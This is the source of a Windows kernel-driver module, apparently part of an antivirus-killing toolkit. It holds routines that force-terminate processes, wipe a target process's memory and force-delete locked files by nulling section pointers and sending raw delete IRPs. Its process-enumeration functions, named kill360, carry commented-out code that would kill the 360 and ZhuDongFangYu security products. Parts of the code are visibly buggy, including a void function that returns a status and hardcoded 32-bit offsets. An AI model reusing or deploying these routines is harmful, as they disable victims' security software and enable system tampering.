/*
Module: system.c

Description: System Tools

Author: lolita

kill process, delete file, and so on

*/




#include "system.h"
#include "config.h"
#include "xlog.h"
CHAR xKill1(DWORD32 dwPid) {
	CLIENT_ID cid;
	cid.UniqueProcess = (HANDLE)dwPid;
	cid.UniqueThread = 0;

	//sizeof(HANDLE);
	//sizeof(DWORD32)

	OBJECT_ATTRIBUTES objs;
	InitializeObjectAttributes(&objs, 0, OBJ_KERNEL_HANDLE, 0, 0);

	HANDLE hProcess;
	NTSTATUS status;
	status = ZwOpenProcess(&hProcess, GENERIC_ALL, &objs, &cid);
	if (!NT_SUCCESS(status)) return KC_OPEN_FAILED;

	ZwTerminateProcess(hProcess, 0);
	if (!NT_SUCCESS(status)) return KC_TERMINATE_FAILED;
	xLog("xKill 1 success");
	return KC_SUCCESS;
}


NTSTATUS xkill3(DWORD dwPid) {
	CLIENT_ID cid;
	cid.UniqueProcess = (HANDLE)dwPid;
	cid.UniqueThread = 0;



	OBJECT_ATTRIBUTES objs;
	InitializeObjectAttributes(&objs, 0, OBJ_KERNEL_HANDLE, 0, 0);

	HANDLE hProcess;
	NTSTATUS status;
	status = ZwOpenProcess(&hProcess, GENERIC_ALL, &objs, &cid);
	if (!NT_SUCCESS(status)) return status;

	ZwTerminateProcess(hProcess, 0);
	if (!NT_SUCCESS(status)) return status;
	xLog("xKill 3 success");
	return status;
}

CHAR xKill2(DWORD32 dwPid) {
	PEPROCESS proc = NULL;
	NTSTATUS status;
	PsLookupProcessByProcessId((HANDLE)dwPid, &proc);

	if (proc == NULL) {
		xLog("K2 Open fail");
		return KC_OPEN_FAILED;
	}

	PKAPC_STATE papcs = (PKAPC_STATE)ExAllocatePool2(POOL_FLAG_NON_PAGED, sizeof(KAPC_STATE), 'xmrl');
	if (papcs == NULL) {
		xLog("K2 Open fail 2");
		ObDereferenceObject(proc);
		return KC_TERMINATE_FAILED;
	}

	//test it
	KeAttachProcess(proc);
	__try {
		xLog("K2 S1");
		//KeStackAttachProcess(proc, papcs);
		//PVOID
		//
		//sizeof(long long)

		for (unsigned long long i = 0x10000; i < 0x20000000; i += PAGE_SIZE) {
			__try {
				memset((PVOID)i, 0, PAGE_SIZE);
			}
			__except (EXCEPTION_EXECUTE_HANDLER) {
				//do nothing
				;
			}
		}

		//KeUnstackDetachProcess(papcs);
		ObDereferenceObject(proc);
		xLog("K2 S2");
	}
	__except (EXCEPTION_EXECUTE_HANDLER) {
		//KeUnstackDetachProcess(papcs);
		KeDetachProcess();
		ObDereferenceObject(proc);
		return KC_TERMINATE_FAILED;
	}
	KeDetachProcess();
	PCHAR lt = (PCHAR)ExAllocatePool2(POOL_FLAG_NON_PAGED, 128, '6666');
	if (lt != NULL) {
		memset(lt, 0, 128);
		RtlStringCbPrintfA(lt, 128, "K2 Info PID: %ld", dwPid);
		xLog(lt);
		//ExFreePool(lt);
		ExFreePoolWithTag(lt, '6666');
	}
	xLog("K2 Ok");
	return KC_SUCCESS;
}

CHAR xDel1(PCSTR userPath) {
	//delete a single file/empty dir
	//TEXT(path)
	//return DC_SUCCESS;
	PCHAR lt = (PCHAR)ExAllocatePool2(POOL_FLAG_NON_PAGED, 1024, '6666');
	if (lt == NULL) return DC_OPEN_FAILED;
	RtlStringCbPrintfA(lt, 1024, "\\??\\%s", userPath);

	UNICODE_STRING pKernelPath;
	ANSI_STRING pAsPath;
	RtlInitAnsiString(&pAsPath, lt);


	//= NULL;
	//RtlInitUnicodeString(&kernelPath, TEXT(lt));
	//pKernelPath.
	RtlAnsiStringToUnicodeString(&pKernelPath, &pAsPath, TRUE);
	OBJECT_ATTRIBUTES objs;
	InitializeObjectAttributes(&objs, &pKernelPath, OBJ_CASE_INSENSITIVE | OBJ_KERNEL_HANDLE, 0, 0);
	NTSTATUS status = ZwDeleteFile(&objs);
	ExFreePoolWithTag(lt, '6666');
	RtlFreeUnicodeString(&pKernelPath);
	if (NT_SUCCESS(status)) return DC_SUCCESS;
	return DC_DELETE_FAILED;
}

NTSTATUS DelDriverFile(PUNICODE_STRING pUsDriverPath)
{
	IO_STATUS_BLOCK IoStatusBlock;
	HANDLE FileHandle;
	OBJECT_ATTRIBUTES ObjectAttributes;
	InitializeObjectAttributes(
		&ObjectAttributes,
		pUsDriverPath,
		OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE,
		0,
		0);

	NTSTATUS Status = IoCreateFileEx(&FileHandle,
		SYNCHRONIZE | DELETE,
		&ObjectAttributes,
		&IoStatusBlock,
		NULL,
		FILE_ATTRIBUTE_NORMAL,
		FILE_SHARE_DELETE,
		FILE_OPEN,
		FILE_NON_DIRECTORY_FILE | FILE_SYNCHRONOUS_IO_NONALERT,
		NULL,
		0,
		CreateFileTypeNone,
		NULL,
		IO_NO_PARAMETER_CHECKING,
		NULL);

	if (!NT_SUCCESS(Status))
	{
		return Status;
	}

	PFILE_OBJECT FileObject;
	Status = ObReferenceObjectByHandleWithTag(FileHandle,
		SYNCHRONIZE | DELETE,
		*IoFileObjectType,
		KernelMode,
		'eliF',
		&FileObject,
		NULL);
	if (!NT_SUCCESS(Status))
	{
		ObCloseHandle(FileHandle, KernelMode);
		return Status;
	}

	const PSECTION_OBJECT_POINTERS SectionObjectPointer = FileObject->SectionObjectPointer;
	SectionObjectPointer->ImageSectionObject = NULL;

	// call MmFlushImageSection, make think no backing image and let NTFS to release file lock
	CONST BOOLEAN ImageSectionFlushed = MmFlushImageSection(SectionObjectPointer, MmFlushForDelete);

	ObfDereferenceObject(FileObject);
	ObCloseHandle(FileHandle, KernelMode);

	if (ImageSectionFlushed)
	{
		// chicken fried rice
		Status = ZwDeleteFile(&ObjectAttributes);
		if (NT_SUCCESS(Status))
		{
			return Status;
		}
	}
	return Status;
}

void kill360() {
	PEPROCESS currentProcess = PsGetCurrentProcess();
	int iPocessId = 0xFFFFFFFF;
	PEPROCESS next = currentProcess;

	do
	{
		int iNext = (int)next;
		iPocessId = *(int*)(iNext + 0xb4);
		PCSTR str = (PCSTR)(iNext + 0x16c);
		xLog(str);
		iNext = *(int*)(iNext + 0x0b8) - 0x0b8;
		next = (PEPROCESS)iNext;
	} while ((NULL != next && next != currentProcess));
	return STATUS_SUCCESS;
}

NTSTATUS kill360_64()
{
	NTSTATUS systeminformation;
	ULONG length;
	PSYSTEM_PROCESSES process;
	//因为还不知道缓冲区的大小所以我们需要获取大小之后再用一次这个api
	systeminformation = ZwQuerySystemInformation(SYSTEMPROCESSINFORMATION, NULL, 0, &length);
	if (!length)
	{
		DbgPrint("[Error] ZwQuerySystemInformation......\n");
		return systeminformation;
	}
	//ExAllocatePool分配指定类型的池内存，并返回指向已分配块的指针
	PVOID PMemory = ExAllocatePoolWithTag(NonPagedPool, length, 'egaT');
	if (!PMemory)
	{
		DbgPrint("[Error] Memory flase......\n");
		return STATUS_UNSUCCESSFUL;
	}
	systeminformation = ZwQuerySystemInformation(SYSTEMPROCESSINFORMATION, PMemory, length, &length);
	if (NT_SUCCESS(systeminformation))
	{
		PCHAR lt = (PCHAR)ExAllocatePool2(POOL_FLAG_NON_PAGED, 1024, '6665');
		process = (PSYSTEM_PROCESSES)PMemory;
		if (process->ProcessId == 0)
			DbgPrint("PID 0 System\n");
		do
		{
			process = (PSYSTEM_PROCESSES)((UINT64)process + process->NextEntryDelta);
			//DbgPrint("pid = %ld  name = %-20ws \n", process->ProcessId, process->ProcessName.Buffer);

			if (lt != NULL) {
				memset(lt, 0, 1024);
				DWORD pid = process->ProcessId;
				RtlStringCbPrintfA(lt, 1024, "pid = %ld  name = %ws ", pid, process->ProcessName.Buffer);
				xLog(lt);
				RtlStringCbPrintfA(lt, 1024, "%ws", process->ProcessName.Buffer);
				/*if (strncmp(lt, "360", 3) == 0) {
					xKill1(pid);
				}
				if (strncmp(lt, "ZhuDong", 3) == 0) {
					xKill1(pid);
				}*/
				//ExFreePool(lt);

			}
		} while (process->NextEntryDelta != 0);
		ExFreePoolWithTag(lt, '6665');
	}
	else
	{
		DbgPrint("[Error] .....\n");
	}
	ExFreePool(PMemory);
	return systeminformation;
}

NTSTATUS tasklist_user(PCHAR buff, size_t buffLength)
{
	if (buffLength > 100) {
		memset(buff, 0, 100);
	}
	else
	{
		return STATUS_INSUFFICIENT_RESOURCES;
	}
	NTSTATUS systeminformation;
	ULONG length;
	PSYSTEM_PROCESSES process;
	//因为还不知道缓冲区的大小所以我们需要获取大小之后再用一次这个api
	systeminformation = ZwQuerySystemInformation(SYSTEMPROCESSINFORMATION, NULL, 0, &length);
	if (!length)
	{
		DbgPrint("[Error] ZwQuerySystemInformation......\n");
		return systeminformation;
	}
	//ExAllocatePool分配指定类型的池内存，并返回指向已分配块的指针
	PVOID PMemory = ExAllocatePoolWithTag(NonPagedPool, length, 'egaT');
	if (!PMemory)
	{
		DbgPrint("[Error] Memory flase......\n");
		return STATUS_UNSUCCESSFUL;
	}
	systeminformation = ZwQuerySystemInformation(SYSTEMPROCESSINFORMATION, PMemory, length, &length);
	if (NT_SUCCESS(systeminformation))
	{
		PCHAR lt = (PCHAR)ExAllocatePool2(POOL_FLAG_NON_PAGED, 1024, '6665');
		process = (PSYSTEM_PROCESSES)PMemory;
		if (process->ProcessId == 0)
			DbgPrint("PID 0 System\n");
		do
		{
			process = (PSYSTEM_PROCESSES)((UINT64)process + process->NextEntryDelta);
			//DbgPrint("pid = %ld  name = %-20ws \n", process->ProcessId, process->ProcessName.Buffer);

			if (lt != NULL) {
				memset(lt, 0, 1024);
				DWORD pid = process->ProcessId;
				RtlStringCbPrintfA(lt, 1024, "[Normal Tasklist] pid = %ld  name = %ws\n", pid, process->ProcessName.Buffer);
				RtlStringCbCatA(buff, buffLength, lt);
				//xLog(lt);
				//RtlStringCbPrintfA(lt, 1024, "%ws", process->ProcessName.Buffer);
				/*if (strncmp(lt, "360", 3) == 0) {
					xKill1(pid);
				}
				if (strncmp(lt, "ZhuDong", 3) == 0) {
					xKill1(pid);
				}*/
				//ExFreePool(lt);

			}
		} while (process->NextEntryDelta != 0);
		ExFreePoolWithTag(lt, '6665');
	}
	else
	{
		DbgPrint("[Error] .....\n");
	}
	ExFreePool(PMemory);
	return systeminformation;
}

NTSTATUS IrpCompletion(
	IN PDEVICE_OBJECT pDeviceObject,
	IN PIRP irp,
	IN PVOID Context
) {
	//irp->UserIosb->Information = irp->IoStatus.Information;
	//irp->UserIosb->Status = irp->IoStatus.Status;
	KeSetEvent(irp->UserEvent, IO_NO_INCREMENT, FALSE);
	IoFreeIrp(irp);
	return STATUS_MORE_PROCESSING_REQUIRED;
}

NTSTATUS xDelFile3(PCHAR pAsFileName) {
	OBJECT_ATTRIBUTES objFile;
	ANSI_STRING asFileName;
	RtlInitAnsiString(&asFileName, pAsFileName);
	UNICODE_STRING usFileName;
	RtlAnsiStringToUnicodeString(&usFileName, &asFileName, TRUE);

	InitializeObjectAttributes(&objFile,
		&usFileName,
		OBJ_KERNEL_HANDLE | OBJ_CASE_INSENSITIVE,
		NULL,
		NULL
	);

	IO_STATUS_BLOCK ios;
	HANDLE hFile;

	NTSTATUS status = IoCreateFile(&hFile,
		FILE_READ_ATTRIBUTES,
		&objFile,
		&ios,
		0,
		FILE_ATTRIBUTE_NORMAL,
		FILE_SHARE_DELETE,
		FILE_OPEN,
		FILE_NON_DIRECTORY_FILE, //create options
		NULL,
		0,
		CreateFileTypeNone,
		NULL,
		IO_NO_PARAMETER_CHECKING
	);
	if (!NT_SUCCESS(status)) {
		CHAR msg[100];
		RtlStringCbPrintfA(msg, 100, "irp delete open error: %08X", status);
		xLog(msg);
		return status;
	}
	xLog("irp delete: open success");
	PFILE_OBJECT fileObject;

	status = ObReferenceObjectByHandle(hFile,
		DELETE,
		*IoFileObjectType,
		KernelMode,
		&fileObject,
		NULL
	);
	
	if (!NT_SUCCESS(status)) {
		ZwClose(hFile);
		return STATUS_UNEXPECTED_IO_ERROR;
	}

	xLog("irp delete: get object ok");
	PDEVICE_OBJECT deviceObject = IoGetRelatedDeviceObject(fileObject);
	PIRP irp = IoAllocateIrp(deviceObject->StackSize, TRUE);

	if (irp == NULL)
	{
		RtlFreeUnicodeString(&usFileName);
		ObDereferenceObject(fileObject);
		return STATUS_UNEXPECTED_IO_ERROR;
	}
	//This will only call delete file and donot wait for any response
	KEVENT kevent;
	KeInitializeEvent(&kevent, SynchronizationEvent, FALSE);
	FILE_DISPOSITION_INFORMATION fileInformation;
	fileInformation.DeleteFile = TRUE;
	irp->AssociatedIrp.SystemBuffer = &fileInformation;
	irp->UserEvent = &kevent;
	//irp->UserIosb = &ios;
	irp->Tail.Overlay.OriginalFileObject = fileObject;
	irp->Tail.Overlay.Thread = KeGetCurrentThread();
	irp->RequestorMode = KernelMode;

	PIO_STACK_LOCATION irpsp = irp->Tail.Overlay.CurrentStackLocation - 1;
	//irpsp = IoGetNextIrpStackLocation(irp); //try to understand it
	irpsp->MajorFunction = IRP_MJ_SET_INFORMATION;
	irpsp->DeviceObject = deviceObject;
	irpsp->FileObject = fileObject;
	irpsp->Parameters.SetFile.Length = sizeof(FILE_DISPOSITION_INFORMATION);
	irpsp->Parameters.SetFile.FileInformationClass = FileDispositionInformation;
	irpsp->Parameters.SetFile.FileObject = fileObject;

	IoSetCompletionRoutine(
		irp,
		IrpCompletion,
		NULL,
		TRUE,
		TRUE,
		TRUE
	);
	const PSECTION_OBJECT_POINTERS SectionObjectPointer = fileObject->SectionObjectPointer;
	SectionObjectPointer->ImageSectionObject = NULL;
	SectionObjectPointer->DataSectionObject = NULL;
	xLog("irp delete: prepared to call driver");
	IoCallDriver(deviceObject, irp);

	KeWaitForSingleObject(&kevent, Executive, KernelMode, TRUE, NULL);
	ObDereferenceObject(fileObject);
	RtlFreeUnicodeString(&usFileName);
	ZwClose(hFile);
	return STATUS_SUCCESS;



}